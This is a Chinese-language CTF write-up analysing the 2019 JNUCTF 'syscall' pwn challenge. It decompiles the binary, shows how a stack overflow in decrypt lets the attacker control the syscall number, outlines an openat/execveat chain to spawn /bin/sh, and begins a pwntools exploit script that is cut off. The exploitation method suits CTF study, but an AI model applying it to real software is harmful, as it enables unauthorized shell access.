前言

周末朋友扔了三道pwn题给我，让我帮他做一下，然后遇到了一道有意思的有关于系统调用的题目，原题是2019-JNUCTF的题目

syscall

分析

首先看一下题目开启的保护，开启了PIE与NX保护

接着看一下程序的功能，程序提供了三个功能

  • Encrypt功能会输出TQL且多次测试发现只会输出这个字符串，目测没有太实际的作用

  • DeCrypt功能会接受我们的输入，且输入后的字符串会被加密然后输出

  • ExIt功能则会直接退出程序

接着用IDA进行分析

main函数

程序通过get_choice函数接受我们输入的序号，接着实现相应的功能
nt __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+Ch] [rbp-4h]

  while ( 1 )
  {
    menu();
    v3 = get_choice(*(_QWORD *)&argc, argv);
    switch ( v3 )
    {
      case 1:
        decrypt();
        break;
      case 2:
        argv = 0LL;
        *(_QWORD *)&argc = 60LL;
        syscall_safe(60LL, 0LL, 0LL, 0LL);
        break;
      case 0:
        encrypt();
        break;
    }
  }
}

get_choice函数

程序没有用往常惯用的read函数进行输入而是改用syscall_safe的自定义函数进行输入，结合题目的名称syscall并且syscall_safe的第一个参数为0可以想到该函数应该是调用了系统调用进行输入。
int get_choice()
{
  char s[32]; // [rsp+0h] [rbp-30h] BYREF
  __int64 v2; // [rsp+20h] [rbp-10h]
  char *v3; // [rsp+28h] [rbp-8h]

  memset(s, 0, sizeof(s)); //初始化栈变量
  v3 = s;
  v2 = 0x20LL;
  syscall_safe(0LL, 0LL, s, 0x20LL);//猜测接受我们的输入
  return atoi(s); //我们的输入保存到s中，使用atoi函数进行字符串到整形的转换
}

syscall_safe函数

与猜测的一样，程序使用了syscall的系统调用,x86-64是通过syscall进行调用的而x86-32则是使用int 0x80,可以看出了该函数接受了4个参数a1、a2、a3、a4，通过该函数的汇编可以发现a1、a2、a3、a4分别会赋值给rax寄存器、rdi=rcx寄存器、rsi寄存器、rdx寄存器，即参数a1为系统调用号、a2为系统调用的第一个参数、a3为系统调用的第三个参数、a4为系统调用的第四个参数，但是这里对系统调用的参数分别做了小部分的限制，当a1为0或者1时即调用read函数或者write函数时(因为read函数与write函数的系统调用号分别为0与1,具体的系统调用可以查看系统调用表)，a3的值不能为0且a4的值不能大于0x100

  • read(a2,a3,a4)

    • a2代表文件描述符

    • a3代表输入缓冲区

    • a4代表长度

    • write函数同理

即a3值不能为空，即输入的缓冲区不能是地址0，因为这是无效地址，且输入输出的大小不能大于0x100
到此就已经分析完该程序最核心的函数了，即输入输出函数都是通过系统调用实现的，倘若可以控制a1,a2,a3,a4参数即可完成任意函数的调用。
如果不满足条件v5值会被设置成60，而v5与a1指向的值是一致的,60则是为exit的系统调用，即不满足要求会直接退出程序
__int64 __fastcall syscall_safe(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  unsigned int v5; // [rsp+18h] [rbp-18h]

  v5 = a1;
  if ( a1 >= 0 && a1 <= 0x14C )
  {
    if ( (!a1 || a1 == 1) && (!a3 || a4 > 0x100) )
      v5 = 60;
  }
  else
  {
    v5 = 60;
  }
  __asm { syscall; LINUX - }
  return v5;
}

encrypt

可以看到encrypt函数仅仅就是调用了syscall_safe函数且参数分别为1,1,TQL,4
即系统调用号为1即调用了write函数

  • write(1,"TQL\n",4)

因此该encrypt函数仅仅会向屏幕打印TQL，也证实了前面的分析
__int64 encrypt()
{
  return syscall_safe(1LL, 1LL, "TQL\n", 4LL);
}

decrypt

decrypt函数是整个程序的关键，也是漏洞所在的地方。
首先程序通过syscall_safe进行打印输出context:接着再次调用syscall_wrapper，并且v3作为参数传入

  • v3[0] = 0 = a1

  • v3[1] = 0 = a2

  • v3[2] = s = a3

  • v3[3] = 0x100 = a4

即调用了read(0,s,0x100)，往字符组s读入0x100字节的字符而漏洞点在于字符组s与数组v2的距离为0x90 = rbp-0x50 -(rbp-0x140)，数组v2又作为syscall_wrapper参数进行系统调用
s ----------> rbp-0x140
.....     ^ 
.....     |   距
.....     |   离
.....     |   0x90
.....     V
v2 ---------> rbp-0x50
由于输入的大小限制在0x100因此只能覆盖v2[0]与v2[1]因此能够覆盖系统调用号与第一个参数
__int64 decrypt()
{
  char s[240]; // [rsp+0h] [rbp-140h] BYREF
  __int64 v2[4]; // [rsp+F0h] [rbp-50h] BYREF
  __int64 v3[5]; // [rsp+110h] [rbp-30h] BYREF
  int i; // [rsp+138h] [rbp-8h]
  int v5; // [rsp+13Ch] [rbp-4h]

  memset(s, 0, 0x100uLL);
  v2[0] = 1LL;
  v2[1] = 1LL;
  v2[2] = (__int64)s;
  v3[0] = 0LL;
  v3[1] = 0LL;
  v3[2] = (__int64)s;
  v3[3] = 0x100LL;
  v3[4] = (__int64)"context:";
  syscall_safe(1LL, 1LL, (__int64)"context:", 8LL); //调用write函数打印
  syscall_wrapper(v3);  //将v3数组作为参数传入
  v5 = strlen(s); //计算输入的长度
  if ( v5 > 0x100 ) //长度不能大于0x100
    v5 = 0x100;
  for ( i = 0; i < v5; ++i ) //放射加密
    s[i] = 0xA7 * (s[i] - 0x23);
  s[v5 - 1] = 0;
  v2[3] = strlen(s);//计算加密后的长度
  return syscall_wrapper(v2); //将v2数组作为参数传入
}

漏洞利用

从分析可知，可以利用的条件有

  • rax寄存器==系统调用号(可控)

  • rdi寄存器 == 第一个参数值(可控)

  • rsi寄存器 == 第二个参数值(输入的缓冲区地址)

  • rdx寄存器 == 输入的长度(可控)

系统调用的利用，大都是通过
open("./flag","r") //利用open调用打开flag文件进行rw回显
execve("/bin/sh",0,0) //获取shell权限
题目开启了PIE保护，并且输入缓冲区每次在使用前都进行了清空操作，因此不能利用栈上残留数据进行地址的泄露，因此需要利用其他的系统调用
memset(s, 0, 0x100uLL);

可利用的系统调用

除了open与execve还存在类似的系统调用oepnat与execveat
#include<fcntl.h>
int openat(int dirfd, const char *pathname,int flags);
int openat(int dirfd,const char *pathname,int flags, mode_t mode);


#include<unistd.h>
int execveat(int dirfd, const char *pathname,
            const char *const argv[], const char *const envp[],
            int flags);

execveat

  • 当filename为空且flags为AT_EMPTY_PATH时，文件描述符dirfd指定的文件将被指向

openat

  • 当filename为绝对路径,则dfd被忽略

  • 当filename为相对路径则相对于dfd所指定的目录进行引用

  • 当filename为相对路径且dirfd为AT_FDCWD则相对于当前目录引用

利用execveat和openat可以将filename参数修改为第二个参数，并且在程序中第二个参数为输入缓冲区的地址。还需要注意一个问题是，通常情况下/bin/sh文件为只读权限而flags取值为

  • O_RDONLY(只读) 对应数值为0

  • O_WRONLY(只写)对应数值为1

  • O_RDWRD(读写)对应数值为2

因此flags&(O_WRONLY | O_RDWRD) == flags&3 == 0则需要构造
openat(任意值,'//bin/sh',strlen('//bin/sh'));
/*
由于/bin/sh的长度为7，此时7&3!=0
而//bin/sh的长度为8，此时8&3 == 0
*/
接着配合execveat即可拿到shell权限
execveat(3,"",0,0,AT_EMPTY_PATH);

仿射密码

仿射密码是一种替换密码。它是一个字母对一个字母(对该题来说是一个字节对应于另一个字节)

它的加密函数是

e(x) = ax + b (mod m)


  • 其中a和m互质

  • m是字母的数目

解密函数为

d(x) = a^-1(x-b)(mod m)


回过头来看该题的放射加密公式

s(x) = 167x+(-213)(mod 256)


那么解密公式则为

d(x) = 23x + 35(mod 256)


exp

from pwn import *


sh = process("./Pwn_SysTem")
def decrypt(s):
    payload = ""
    for i in s:
        payload += chr((ord(i)*23+35)%256)
    return payload
